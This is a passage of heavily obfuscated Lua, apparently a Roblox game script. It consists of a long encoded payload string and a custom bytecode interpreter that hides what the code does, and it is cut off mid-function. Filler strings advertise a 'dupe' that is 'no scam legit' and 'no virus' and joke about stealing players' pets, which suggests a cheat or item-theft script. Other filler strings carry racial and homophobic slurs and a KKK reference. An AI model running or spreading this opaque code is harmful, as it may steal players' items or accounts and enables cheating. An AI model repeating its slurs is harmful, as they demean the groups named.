㒙㒗㒥㒘㒣㒗㒝㒗㒙㒚㒠㒦㒡㒣㒘㒦㒙㒥㒥㒥㒡㒥㒝㒥㒙㒤㒥㒘㒘㒤㒝㒗㒤㒣㒥㒣㒣㒣㒝㒤㒙㒢㒥㒢㒡㒥㒝㒢㒙㒦㒘㒡㒡㒤㒤㒡㒙㒣㒥㒠㒡㒠㒝㒣㒝㒟㒥㒦㒥㒟㒝㒥㒛㒞㒥㒟㒡㒞㒝㒞㒙㒡㒙㒝㒡㒢㒟㒝㒙㒜㒦㒜㒡㒝㒟㒜㒙㒛㒥㒟㒘㒛㒝㒞㒚㒚㒥㒚㒡㒚㒝㒜㒙㒙㒥㒙㒡㒜㒤㒙㒙㒜㒜㒘㒡㒘㒝㒘㒚㒙㒗㒗㒡㒗㒝㒚㒡㒦㒥㒘㒙㒦㒝㒦㒙㒥㒥㒦㒣㒥㒝㒥㒙㒘㒞㒤㒡㒥㒥㒤㒙㒣㒥㒣㒡㒤㒟㒣㒙㒢㒥㒦㒛㒢㒝㒣㒡㒡㒥㒡㒡㒡㒝㒡㒙㒠㒥㒠㒡㒣㒤㒠㒙㒣㒟㒟㒡㒟㒟㒟㒙㒟㒥㒞㒡㒞㒝㒡㒝㒝㒥㒚㒥㒝㒝㒠㒠㒜㒥㒝㒣㒜㒝㒜㒙㒟㒜㒛㒡㒚㒛㒛㒙㒚㒥㒚㒡㒜㒝㒚㒙㒙㒥㒝㒘㒙㒝㒜㒠㒘㒥㒛㒗㒘㒝㒙㒛㒗㒥㒗㒡㒚㒥㒗㒙㒚㒜㒦㒡㒦㒝㒦㒙㒗㒗㒥㒡㒥㒝㒘㒢㒤㒥㒡㒜㒤㒝㒤㒙㒣㒥㒤㒣㒣㒝㒣㒙㒦㒟㒢㒡㒡㒥㒢㒙㒡㒥㒡㒡㒢㒟㒡㒙㒠㒥㒤㒜㒠㒝㒜㒤㒟㒥㒟㒡㒟㒝㒟㒙㒞㒥㒞㒡㒡㒤㒞㒙㒡㒠㒝㒡㒝㒟㒝㒙㒝㒥㒜㒡㒜㒝㒟㒝㒛㒥㒞㒟㒛㒝㒞㒠㒚㒥㒛㒣㒚㒝㒚㒙㒝㒜㒙㒡㒘㒛㒙㒙㒘㒥㒘㒡㒚㒝㒘㒙㒗㒥㒛㒘㒗㒝㒚㒠㒦㒥㒙㒗㒦㒝㒗㒛㒥㒥㒥㒡㒘㒥㒥㒙㒡㒠㒤㒡㒤㒝㒤㒙㒥㒗㒣㒡㒣㒝㒦㒢㒢㒥㒝㒛㒢㒝㒢㒙㒡㒥㒢㒣㒡㒝㒡㒙㒤㒟㒠㒡㒝㒘㒠㒙㒟㒥㒟㒡㒠㒟㒟㒙㒞㒥㒢㒜㒞㒝㒝㒤㒝㒥㒝㒡㒝㒝㒝㒙㒜㒥㒜㒡㒟㒤㒜㒙㒟㒠㒛㒡㒛㒟㒛㒙㒛㒥㒚㒡㒚㒝㒝㒝㒙㒥㒝㒤㒙㒝㒜㒠㒘㒥㒛㒡㒘㒝㒘㒙㒛㒙㒗㒡㒞㒟㒗㒙㒦㒜㒦㒡㒗㒟㒦㒙㒥㒥㒙㒘㒥㒝㒝㒘㒤㒥㒤㒡㒤㒝㒦㒙㒣㒥㒣㒡㒦㒤㒣㒙㒦㒜㒢㒡㒚㒥㒢㒙㒣㒥㒡㒡㒡㒝㒤㒠㒠㒥㒤㒘㒠㒝㒤㒘㒟㒥㒠㒡㒟㒝㒟㒙㒢㒙㒞㒡㒦㒥㒞㒙㒡㒜㒝㒡㒠㒝㒝㒙㒜㒥㒟㒥㒜㒝㒝㒝㒛㒥㒡㒣㒛㒝㒜㒛㒚㒥㒚㒡㒝㒤㒚㒙㒜㒦㒙㒡㒙㒝㒙㒙㒚㒥㒘㒡㒘㒝㒛㒠㒗㒥㒛㒘㒗㒝㒗㒙㒦㒦㒗㒣㒦㒝㒦㒙㒙㒝㒥㒡㒚㒚㒥㒙㒤㒥㒤㒡㒥㒟㒤㒙㒣㒥㒗㒚㒣㒝㒗㒦㒢㒥㒢㒡㒢㒝㒣㒛㒡㒥㒡㒡㒥㒗㒡㒙㒥㒢㒠㒡㒠㒝㒠㒙㒟㒥㒟㒡㒟㒝㒢㒠㒞㒥㒢㒛㒞㒝㒞㒛㒝㒥㒞㒡㒝㒝㒝㒙㒠㒙㒜㒡㒦㒙㒜㒙㒟㒜㒛㒡㒞㒝㒛㒙㒚㒥㒝㒥㒚㒝㒟㒦㒙㒥㒛㒛㒙㒝㒜㒙㒘㒥㒘㒡㒛㒡㒘㒙㒘㒡㒗㒡㒗㒦㒗㒚㒙㒥㒦㒡㒦㒝㒙㒝㒥㒥㒡㒗㒥㒝㒦㒣㒤㒥㒥㒣㒤㒝㒤㒙㒗㒜㒣㒡㒞㒛㒣㒙㒢㒥㒢㒡㒤㒝㒢㒙㒡㒥㒥㒘㒡㒝㒤㒠㒠㒥㒣㒗㒠㒝㒡㒛㒟㒥㒟㒡㒢㒥㒟㒙㒛㒠㒞㒡㒞㒝㒞㒙㒟㒗㒝㒡㒝㒝㒠㒢㒜㒥㒚㒥㒜㒝㒜㒙㒛㒥㒛㒡㒛㒝㒛㒙㒞㒜㒚㒡㒝㒦㒚㒙㒚㒗㒙㒡㒚㒝㒙㒙㒘㒥㒛㒦㒘㒝㒗㒘㒗㒥㒛㒘㒗㒝㒘㒙㒦㒥㒦㒡㒙㒢㒦㒙㒛㒗㒥㒡㒘㒡㒥㒙㒦㒗㒤㒡㒤㒝㒗㒠㒣㒥㒝㒢㒣㒝㒣㒙㒢㒥㒤㒡㒢㒝㒢㒙㒥㒜㒡㒡㒤㒤㒡㒙㒣㒛㒠㒡㒠㒝㒠㒙㒟㒥㒣㒙㒟㒝㒟㒚㒞㒥㒞㒡㒞㒝㒟㒛㒝㒥㒝㒡㒠㒦㒝㒙㒙㒜㒜㒡㒜㒝㒜㒙㒝㒥㒛㒡㒛㒝㒞㒢㒚㒥㒞㒚㒚㒝㒜㒟㒙㒥㒚㒣㒙㒝㒙㒙㒜㒟㒘㒡㒥㒘㒘㒙㒗㒥㒗㒡㒘㒟㒗㒙㒦㒥㒚㒜㒦㒝㒙㒚㒥㒥㒥㒡㒥㒝㒗㒙㒤㒥㒤㒡㒘㒘㒤㒙㒗㒠㒣㒡㒣㒝㒣㒚㒤㒗㒢㒡㒢㒝㒥㒥㒡㒥㒣㒙㒡㒝㒡㒙㒠㒥㒡㒣㒠㒝㒠㒙㒣㒢㒟㒡㒡㒗㒟㒚㒞㒥㒞㒡㒟㒟㒞㒙㒝㒥㒡㒟㒝㒝㒞㒣㒜㒦㒜㒡㒜㒝㒜㒙㒛㒥㒛㒡㒟㒘㒛㒙㒞㒣㒚㒡㒚㒝㒚㒙㒙㒥㒙㒡㒙㒝㒜㒢㒘㒥㒘㒡㒘㒝㒘㒛㒗㒥㒘㒣㒜㒛㒗㒙㒚㒟㒦㒡㒢㒤㒦㒙㒥㒥㒥㒡㒗㒝㒥㒙㒤㒥㒘㒛㒤㒝㒗㒣㒣㒥㒦㒗㒣㒝㒤㒛㒢㒥㒢㒡㒦㒘㒢㒙㒗㒣㒡㒡㒡㒝㒡㒙㒢㒗㒠㒡㒠㒝㒣㒥㒟㒥㒢㒢㒟㒝㒟㒙㒞㒥㒠㒡㒞㒝㒞㒙㒡㒡㒝㒡㒡㒙㒝㒙㒜㒥㒜㒢㒝㒟㒜㒙㒛㒥㒟㒞㒛㒝㒝㒜㒚㒥㒚㒡㒚㒝㒛㒛㒙㒥㒙㒡㒝㒛㒙㒙㒟㒛㒘㒡㒘㒝㒘㒙㒙㒗㒗㒡㒗㒝㒛㒘㒦㒥㒘㒙㒦㒝㒦㒙㒥㒥㒥㒡㒥㒝㒥㒙㒘㒡㒤㒡㒘㒜㒤㒙㒣㒥㒣㒡㒣㒝㒣㒙㒢㒥㒦㒛㒢㒝㒢㒙㒡㒥㒡㒡㒡㒝㒡㒙㒡㒞㒠㒡㒣㒥㒠㒙㒟㒥㒟㒡㒟㒞㒟㒙㒞㒥㒥㒗㒞㒝㒡㒠㒝㒥㒝㒣㒝㒝㒝㒛㒜㒥㒝㒡㒝㒢㒜㒙㒟㒛㒛㒡㒤㒟㒛㒙㒞㒜㒚㒡㒛㒝㒛㒞㒙㒥㒝㒗㒙㒝㒞㒛㒘㒥㒛㒥㒘㒝㒘㒟㒘㒙㒗㒡㒚㒤㒗㒙㒦㒦㒦㒡㒦㒞㒦㒙㒥㒦㒥㒡㒥㒝㒘㒡㒤㒥㒤㒡㒤㒝㒥㒚㒣㒥㒣㒡㒣㒝㒤㒛㒣㒚㒢㒡㒥㒥㒢㒙㒢㒙㒡㒢㒡㒝㒡㒙㒢㒥㒠㒡㒠㒝㒣㒡㒟㒥㒣㒙㒟㒝㒣㒤㒞㒥㒞㒡㒞㒝㒞㒙㒡㒞㒝㒡㒠㒤㒝㒙㒜㒥㒜㒡㒜㒝㒜㒙㒛㒥㒟㒙㒛㒝㒛㒛㒚㒥㒚㒣㒚㒝㒚㒙㒙㒥㒙㒡㒜㒥㒙㒙㒘㒦㒘㒡㒘㒞㒘㒙㒘㒛㒗㒥㒗㒝㒚㒡㒦㒥㒗㒙㒦㒝㒦㒚㒥㒥㒥㒢㒥㒝㒥㒙㒘㒝㒤㒡㒤㒝㒤㒙㒥㒣㒣㒡㒣㒝㒣㒙㒤㒗㒢㒦㒢㒝㒥㒢㒡㒥㒡㒥㒡㒞㒡㒙㒠㒥㒢㒡㒠㒝㒠㒙㒣㒞㒟㒡㒢㒦㒟㒙㒣㒠㒞㒡㒞㒝㒞㒙㒝㒥㒡㒛㒝㒝㒠㒡㒜㒥㒜㒡㒜㒝㒜㒙㒛㒥㒛㒡㒞㒦㒛㒙㒛㒗㒚㒡㒚㒟㒚㒙㒙㒥㒙㒡㒙㒝㒜㒢㒘㒥㒘㒢㒘㒝㒘㒚㒗㒥㒘㒗㒗㒡㒗㒙㒚㒞㒦㒡㒗㒗㒦㒙㒥㒦㒥㒡㒥㒞㒥㒙㒤㒥㒘㒙㒤㒝㒤㒙㒣㒥㒥㒡㒣㒝㒣㒙㒢㒥㒣㒣㒢㒢㒢㒙㒥㒟㒡㒡㒡㒡㒡㒚㒠㒥㒠㒡㒢㒝㒠㒙㒟㒥㒣㒛㒟㒝㒢㒣㒞㒥㒣㒜㒞㒝㒞㒙㒝㒥㒝㒡㒡㒘㒝㒙㒠㒞㒜㒡㒜㒝㒜㒙㒛㒥㒛㒡㒛㒝㒞㒣㒚㒥㒚㒣㒚㒝㒚㒛㒙㒥㒙㒡㒙㒝㒙㒙㒜㒟㒘㒡㒘㒞㒘㒙㒗㒦㒗㒡㒗㒣㒗㒝㒦㒥㒚㒛㒦㒝㒦㒛㒥㒥㒥㒢㒥㒝㒥㒚㒤㒥㒤㒡㒗㒥㒤㒙㒣㒥㒣㒡㒥㒝㒣㒙㒢㒥㒢㒡㒣㒟㒢㒞㒡㒥㒥㒜㒡㒝㒡㒝㒠㒦㒠㒡㒠㒝㒢㒙㒟㒥㒟㒡㒣㒘㒟㒙㒢㒠㒞㒡㒣㒘㒞㒙㒝㒥㒝㒡㒝㒝㒠㒥㒜㒥㒠㒛㒜㒝㒜㒙㒛㒥㒛㒡㒛㒝㒛㒙㒞㒠㒚㒡㒚㒟㒚㒙㒚㒗㒙㒡㒙㒝㒙㒙㒘㒥㒜㒜㒘㒝㒘㒚㒗㒥㒗㒢㒗㒝㒗㒟㒗㒙㒦㒡㒚㒘㒦㒙㒦㒞㒥㒡㒥㒞㒥㒙㒤㒦㒤㒡㒤㒝㒗㒡㒣㒥㒣㒡㒣㒝㒥㒛㒢㒥㒢㒡㒢㒝㒣㒛㒢㒚㒡㒡㒥㒙㒡㒙㒡㒙㒠㒢㒠㒝㒠㒙㒡㒥㒟㒡㒟㒝㒢㒥㒞㒥㒢㒝㒞㒝㒢㒤㒝㒥㒝㒡㒝㒝㒝㒙㒠㒢㒜㒡㒠㒘㒜㒙㒛㒥㒛㒡㒛㒝㒛㒙㒚㒥㒞㒝㒚㒝㒚㒛㒙㒥㒙㒣㒙㒝㒙㒙㒘㒥㒘㒡㒜㒙㒘㒙㒗㒦㒗㒡㒗㒞㒗㒙㒗㒛㒦㒥㒦㒝㒙㒥㒥㒥㒦㒞㒥㒝㒥㒚㒤㒥㒤㒢㒤㒝㒤㒙㒗㒝㒣㒡㒣㒝㒣㒙㒥㒙㒢㒡㒢㒝㒢㒙㒣㒗㒡㒦㒡㒝㒤㒦㒠㒥㒠㒥㒠㒞㒠㒙㒟㒥㒡㒡㒟㒝㒟㒙㒢㒢㒞㒡㒢㒚㒞㒙㒢㒠㒝㒡㒝㒝㒝㒙㒜㒥㒠㒟㒜㒝㒟㒥㒛㒥㒛㒡㒛㒝㒛㒙㒚㒥㒚㒡㒞㒚㒚㒙㒚㒗㒙㒡㒙㒟㒙㒙㒘㒥㒘㒡㒘㒝㒛㒦㒗㒥㒗㒢㒗㒝㒗㒚㒦㒥㒗㒗㒦㒡㒦㒙㒙㒢㒥㒡㒥㒡㒥㒙㒤㒦㒤㒡㒤㒞㒤㒙㒣㒥㒗㒙㒣㒝㒣㒙㒢㒥㒥㒗㒢㒝㒢㒙㒡㒥㒢㒣㒡㒢㒡㒙㒤㒣㒠㒡㒠㒡㒠㒚㒟㒥㒟㒡㒡㒝㒟㒙㒞㒥㒢㒟㒞㒝㒢㒗㒝㒥㒢㒜㒝㒝㒝㒙㒜㒥㒜㒡㒠㒜㒜㒙㒟㒢㒛㒡㒛㒝㒛㒙㒚㒥㒚㒡㒚㒝㒞㒗㒙㒥㒙㒣㒙㒝㒙㒛㒘㒥㒘㒡㒘㒝㒘㒙㒛㒣㒗㒡㒗㒞㒗㒙㒦㒦㒦㒡㒦㒣㒦㒝㒥㒥㒙㒟㒥㒝㒥㒟㒤㒥㒤㒢㒤㒝㒤㒚㒣㒥㒣㒡㒦㒥㒣㒙㒢㒥㒢㒡㒤㒥㒢㒙㒡㒥㒡㒡㒢㒟㒡㒞㒠㒥㒤㒠㒠㒝㒠㒝㒟㒦㒟㒡㒟㒝㒡㒙㒞㒥㒞㒡㒢㒜㒞㒙㒡㒤㒝㒡㒢㒘㒝㒙㒜㒥㒜㒡㒜㒝㒠㒙㒛㒥㒟㒟㒛㒝㒛㒙㒚㒥㒚㒡㒚㒝㒚㒙㒝㒤㒙㒡㒙㒟㒙㒙㒙㒗㒘㒡㒘㒝㒘㒙㒗㒥㒛㒠㒗㒝㒗㒚㒦㒥㒦㒢㒦㒝㒦㒟㒦㒙㒥㒡㒙㒜㒥㒙㒥㒡㒤㒡㒤㒞㒤㒙㒣㒦㒣㒡㒣㒝㒦㒡㒢㒥㒢㒡㒢㒝㒤㒣㒡㒥㒡㒡㒡㒝㒢㒛㒡㒚㒠㒡㒤㒝㒠㒙㒠㒙㒟㒢㒟㒝㒟㒙㒠㒥㒞㒡㒞㒝㒢㒙㒝㒥㒡㒡㒝㒝㒡㒤㒜㒥㒜㒡㒜㒝㒜㒙㒟㒦㒛㒡㒟㒜㒛㒙㒚㒥㒚㒡㒚㒝㒚㒙㒙㒥㒝㒡㒙㒝㒙㒛㒘㒥㒘㒣㒘㒝㒘㒙㒗㒥㒗㒡㒛㒝㒗㒙㒦㒦㒦㒡㒦㒞㒦㒙㒦㒛㒥㒥㒥㒝㒙㒙㒤㒥㒥㒜㒤㒝㒤㒚㒣㒥㒣㒢㒣㒝㒣㒙㒦㒝㒢㒡㒢㒝㒢㒙㒤㒡㒡㒡㒡㒝㒡㒙㒢㒗㒠㒦㒠㒝㒤㒚㒟㒥㒟㒥㒟㒞㒟㒙㒞㒥㒠㒡㒞㒝㒞㒙㒡㒦㒝㒡㒡㒞㒝㒙㒡㒠㒜㒡㒜㒝㒜㒙㒛㒥㒟㒣㒛㒝㒟㒙㒚㒥㒚㒡㒚㒝㒚㒙㒙㒥㒙㒡㒝㒞㒙㒙㒙㒗㒘㒡㒘㒟㒘㒙㒗㒥㒗㒡㒗㒝㒛㒚㒦㒥㒦㒢㒦㒝㒦㒚㒥㒥㒦㒗㒥㒡㒥㒙㒘㒦㒤㒡㒤㒠㒤㒙㒣㒦㒣㒡㒣㒞㒣㒙㒢㒥㒦㒙㒢㒝㒢㒙㒡㒥㒤㒟㒡㒝㒡㒙㒠㒥㒡㒣㒠㒢㒠㒙㒤㒗㒟㒡㒟㒡㒟㒚㒞㒥㒞㒡㒠㒝㒞㒙㒝㒥㒡㒣㒝㒝㒡㒛㒜㒥㒡㒜㒜㒝㒜㒙㒛㒥㒛㒡㒟㒠㒛㒙㒞㒦㒚㒡㒚㒝㒚㒙㒙㒥㒙㒡㒙㒝㒝㒛㒘㒥㒘㒣㒘㒝㒘㒛㒗㒥㒗㒡㒗㒝㒗㒙㒛㒗㒦㒡㒦㒞㒦㒙㒥㒦㒥㒡㒥㒣㒥㒝㒤㒥㒘㒣㒤㒝㒤㒙㒣㒥㒣㒢㒣㒝㒣㒚㒢㒥㒢㒡㒥㒥㒢㒙㒡㒥㒡㒡㒤㒡㒡㒙㒠㒥㒠㒡㒡㒟㒠㒞㒟㒥㒣㒤㒟㒝㒟㒝㒞㒦㒞㒡㒞㒝㒠㒙㒝㒥㒝㒡㒡㒠㒝㒙㒡㒘㒜㒡㒡㒘㒜㒙㒛㒥㒛㒡㒛㒝㒟㒝㒚㒥㒞㒣㒚㒝㒚㒙㒙㒥㒙㒡㒙㒝㒙㒙㒝㒘㒘㒡㒘㒟㒘㒙㒘㒗㒗㒡㒗㒝㒗㒙㒦㒥㒚㒤㒦㒝㒦㒚㒥㒥㒥㒢㒥㒝㒥㒙㒚㒞㒤㒡㒤㒝㒤㒙㒣㒦㒣㒡㒣㒝㒣㒙㒢㒥");local C=((94+-0x41)+-#[[cilerteddoesntlikeburgers]])local l=90 local o=d;local e={}e={[(-0x51+82)]=function()local e,a,r,d=v(Y,o,o+m);o=o+g;l=(l+(C*g))%n;return(((d+l-(C)+f*(g*p))%f)*((p*H)^p))+(((r+l-(C*p)+f*(p^m))%n)*(f*n))+(((a+l-(C*m)+H)%n)*f)+((e+l-(C*g)+H)%n);end,[((0x770/112)+-#[[W4rboy was here]])]=function(e,e,e)local e=v(Y,o,o);o=o+S;l=(l+(C))%n;return((e+l-(C)+H)%f);end,[(-#'fatee is gay 0nly on top'+(0x7e-(0x127-196)))]=function()local d,e=v(Y,o,o+p);l=(l+(C*p))%n;o=o+p;return(((e+l-(C)+f*(p*g))%f)*n)+((d+l-(C*p)+n*(p^m))%f);end,[((0x90+-33)-107)]=function(l,e,o)if o then local e=(l/p^(e-d))%p^((o-S)-(e-d)+S);return e-e%d;else local e=p^(e-S);return(l%(e+e)>=e)and d or y;end;end,[(0x1e5/97)]=function()local o=e[(0x42-65)]();local a=e[(0xa1/161)]();local r=d;local l=(e[(0x2dc/(-#"Faggot"+(449-0x104)))](a,S,z+g)*(p^(z*p)))+o;local o=e[((3192/0xa8)+-#"W4rboy was here")](a,21,31);local e=((-d)^e[(-0x65+105)](a,32));if(o==y)then if(l==A)then return e*y;else o=S;r=A;end;elseif(o==(f*(p^m))-S)then return(l==y)and(e*(S/A))or(e*(y/A));end;return R(e,o-((n*(g))-d))*(r+(l/(p^V)));end,[(-#'nerd'+(0x10e/27))]=function(a,r,r)local r;if(not a)then a=e[(-#'when the he went where when he where where when the he when ther wher he then here went'+(274-0xba))]();if(a==y)then return'';end;end;r=G(Y,o,o+a-d);o=o+a;local e=''for o=S,#r do e=j(e,I((v(G(r,o,o))+l)%n))l=(l+C)%f end return e;end}local function H(...)return{...},K('#',...)end local function Y()local x={};local i={};local o={};local a={x,i,nil,o};local l={}local c=(12+-#{22,'}';'nil'})local n={[((0x8f0/88)+-#"fatee is gay 0nly on top")]=(function(o)return not(#o==e[((104/0xd)+-#'Ur mom')]())end),[((0x999/189)+-#"send nudes")]=(function(o)return e[(0x2df/147)]()end),[(((-0x7bc/55)+0x54)+-#[[never gonna give you up never gonna let you down]])]=(function(o)return e[(0x1d-23)]()end),[(752/0xbc)]=(function(o)local d=e[(0x64+-94)]()local e=''local o=1 for l=1,#d do o=(o+c)%n e=j(e,I((v(d:sub(l,l))+o)%f))end return e end)};for e=S,e[(173/0xad)]()do i[e-S]=Y();end;local o=e[(((221+-0x7c)+-#"Nsrds GAYYYYAIAHAKAJAVAHAUA")/70)]()for o=1,o do local e=e[(0x58-86)]();local d;local e=n[e%(4200/0x64)];l[o]=e and e({});end;for a=1,e[(0xb1/177)]()do local o=e[(0x11c/142)]();if(e[(-#"Impulse real 2022"+(0x1497/(-0x2f+298)))](o,d,S)==A)then local c=e[(-#[[this is a meme string]]+(166-0x8d))](o,p,m);local n=e[((0x17da/142)+-#[[papier ist ein kleiner schwanz lutscher]])](o,g,p+g);local o={e[((((83-0x60)+-#"never gonna give you up never gonna let you down")+0x49)+-#"Deezbutts")](),e[(-102+0x69)](),nil,nil};local i={[(71+-0x47)]=function()o[u]=e[(0x7a+-119)]();o[D]=e[(((0xd6+-93)+-#[[nicowashere]])-107)]();end,[(67-0x42)]=function()o[t]=e[((1105/0x55)+-#'deadphonelua')]();end,[(0x6d+-107)]=function()o[u]=e[(0x42+-65)]()-(p^z)end,[(45+-0x2a)]=function()o[t]=e[((0x43+(-26-0x14))+-#"Impulse youtube real")]()-(p^z)o[M]=e[(375/0x7d)]();end};i[c]();if(e[(103+(-165+0x42))](n,S,d)==S)then o[r]=l[o[r]]end if(e[((112-0x5c)+-0x10)](n,p,p)==d)then o[t]=l[o[U]]end if(e[(0x6b-103)](n,m,m)==S)then o[_]=l[o[_]]end x[a]=o;end end;a[3]=e[(138/0x45)]();return a;end;local function A(e,y,f)local v=e[p];local o=e[m];local n=e[d];return(function(...)local z={};local C=o;local m=H local l={};local o=d;local e=d e*=-1 local g=e;local Y=K('#',...)-S;local v=v;local I={};local n=n;local H={...};for e=0,Y do if(e>=C)then I[e-C]=H[e+S];else l[e]=H[e+d];end;end;local e=Y-C+d local e;local C;while true do e=n[o];C=e[((0x56-65)+-#"Cock and ball tortue")];a=(91154)while((((857105/0x25)+-#"how to join the kkk")/0x8e)+-#"when the he went where when he where where when the he when ther wher he then here went")>=C do a-= a a=(9634482)while C<=(-#[[niggers]]+(9768/0xde))do a-= a a=(6687144)while C<=((5589/0xcf)+-#"Crackzzzz")do a-= a a=(5690992)while(976/0x7a)>=C do a-= a a=(591360)while C<=((0x65-82)+-#'warboy hates you')do a-= a a=(4576752)while(0x50/80)>=C do a-= a a=(2155500)while(-#[[nerd]]+(-0x66+((389-0xee)+-#"testpsx dupe no scam legit 2022 free no virus")))<C do a-= a local d=e[c];local o=l[d]for e=d+1,e[M]do o=o..l[e];end;l[e[r]]=o;break end while 1437==(a)/((-#"W4rboy was here"+(-0x6f+1626)))do l[e[b]]=#l[e[u]];break end;break;end while 1776==(a)/((0x148e-2685))do a=(4152295)while(-#[[panzerfaust]]+(0x67+(-0xe6a/41)))<C do a-= a local a;l[e[r]]=f[e[c]];o=o+d;e=n[o];l[e[w]]=l[e[u]][e[_]];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];l[e[b]]=e[k];o=o+d;e=n[o];l[e[O]]=e[c];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[w]][e[c]]=l[e[M]];o=o+d;e=n[o];l[e[i]]=f[e[u]];o=o+d;e=n[o];l[e[r]]=l[e[k]][e[B]];o=o+d;e=n[o];l[e[O]]=e[h];o=o+d;e=n[o];l[e[r]]=e[c];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[w]][e[u]]=l[e[N]];o=o+d;e=n[o];l[e[i]]=f[e[c]];o=o+d;e=n[o];l[e[x]]=l[e[k]][e[N]];o=o+d;e=n[o];l[e[x]]=l[e[k]][e[M]];o=o+d;e=n[o];l[e[r]][e[U]]=l[e[N]];o=o+d;e=n[o];l[e[r]][e[t]]=e[D];o=o+d;e=n[o];l[e[x]]=f[e[c]];o=o+d;e=n[o];l[e[r]]=l[e[u]][e[P]];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];l[e[r]]=e[U];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[i]][e[c]]=l[e[N]];o=o+d;e=n[o];l[e[O]][e[c]]=e[M];o=o+d;e=n[o];l[e[b]][e[h]]=e[_];o=o+d;e=n[o];l[e[O]][e[k]]=e[B];o=o+d;e=n[o];l[e[r]][e[U]]=e[D];o=o+d;e=n[o];l[e[i]][e[k]]=l[e[N]];o=o+d;e=n[o];l[e[r]]=f[e[u]];o=o+d;e=n[o];l[e[x]]=l[e[c]][e[N]];o=o+d;e=n[o];l[e[r]]=e[c];o=o+d;e=n[o];l[e[w]]=e[t];o=o+d;e=n[o];l[e[x]]=e[t];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[x]][e[c]]=l[e[N]];o=o+d;e=n[o];l[e[w]][e[c]]=e[N];o=o+d;e=n[o];l[e[r]]=f[e[u]];o=o+d;e=n[o];l[e[r]]=l[e[t]][e[_]];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];l[e[b]]=e[h];o=o+d;e=n[o];l[e[b]]=e[U];o=o+d;e=n[o];l[e[w]]=e[t];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[i]][e[t]]=l[e[N]];o=o+d;e=n[o];l[e[b]]=f[e[u]];o=o+d;e=n[o];l[e[w]]=l[e[t]][e[_]];o=o+d;e=n[o];l[e[O]]=e[t];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];l[e[r]]=e[c];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[b]][e[u]]=l[e[M]];o=o+d;e=n[o];l[e[x]]=f[e[c]];o=o+d;e=n[o];l[e[r]]=l[e[h]][e[P]];o=o+d;e=n[o];l[e[O]]=l[e[h]][e[_]];o=o+d;e=n[o];l[e[x]][e[t]]=l[e[P]];o=o+d;e=n[o];l[e[r]][e[u]]=e[N];o=o+d;e=n[o];l[e[w]]=f[e[h]];o=o+d;e=n[o];l[e[w]]=l[e[h]][e[_]];o=o+d;e=n[o];l[e[x]]=e[u];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];l[e[x]]=e[c];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[i]][e[k]]=l[e[P]];o=o+d;e=n[o];l[e[x]][e[h]]=e[M];o=o+d;e=n[o];l[e[x]][e[U]]=e[M];o=o+d;e=n[o];l[e[r]][e[h]]=e[B];o=o+d;e=n[o];l[e[r]][e[h]]=e[M];o=o+d;e=n[o];l[e[i]][e[U]]=l[e[_]];o=o+d;e=n[o];l[e[i]]=f[e[h]];o=o+d;e=n[o];l[e[i]]=l[e[c]][e[N]];o=o+d;e=n[o];l[e[O]]=e[c];o=o+d;e=n[o];l[e[r]]=e[c];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[U]))break end while 3115==(a)/(((0x64e67/151)-0x57c))do if(l[e[w]]~=l[e[B]])then o=o+S;else o=e[U];end;break end;break;end break;end while(a)/((-0x17+471))==1320 do a=(4188992)while C<=(-#'Niggabyte'+(0x8f-129))do a-= a a=(2915004)while(0x19c/103)<C do a-= a local a;l[e[i]]=f[e[k]];o=o+d;e=n[o];l[e[w]]=l[e[h]][e[B]];o=o+d;e=n[o];l[e[i]]=l[e[c]];o=o+d;e=n[o];a=e[b]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[i]]();break end while 842==(a)/(((-76+(696584/0xc4))+-#[[cruz pp is large]]))do local i=v[e[U]];local r;local d={};r=L({},{__index=function(o,e)local e=d[e];return e[1][e[2]];end,__newindex=function(l,e,o)local e=d[e]e[1][e[2]]=o;end;});for a=1,e[M]do o=o+S;local e=n[o];if e[(0x77/119)]==56 then d[a-1]={l,e[h]};else d[a-1]={y,e[h]};end;z[#z+1]=d;end;l[e[w]]=A(i,r,f);break end;break;end while(a)/((3635-0x74a))==2368 do a=(11626563)while(((185+-0x1c)+-#"when the he went where when he where where when the he when ther wher he then here went")-0x40)>=C do a-= a if(l[e[w]]==l[e[M]])then o=o+S;else o=e[u];end;break;end while(a)/(((-0x21-26)+3770))==3133 do a=(4454886)while C>(0x428/152)do a-= a local e={l,e};e[S][e[p][w]]=e[d][e[p][N]]+e[S][e[p][U]];break end while 3342==(a)/((-#"atakan der nigga"+((-0x40+1449)+-0x24)))do l[e[x]]=l[e[h]][e[_]];break end;break;end break;end break;end break;end while(a)/((-#[[niggers]]+(350435/0x6d)))==1774 do a=(14177418)while C<=((0x86-(-0x40+169))+-#"Fucking Retarted")do a-= a a=(6340104)while C<=(-93+0x67)do a-= a a=(796635)while C>(-#"deadphonelua"+(73-(-#[[psx real dupe steal all ur pets no joke]]+(0x3169/139))))do a-= a local e=e[r]l[e](l[e+S])break end while(a)/((0x1688-2933))==281 do local e=e[b];local o=l[e];for e=e+1,g do F(o,l[e])end;break end;break;end while(a)/((-0x11+1574))==4072 do a=(431730)while C<=(-#"Impulse youtube real"+(4247/0x89))do a-= a local x;local t,k;local b;local 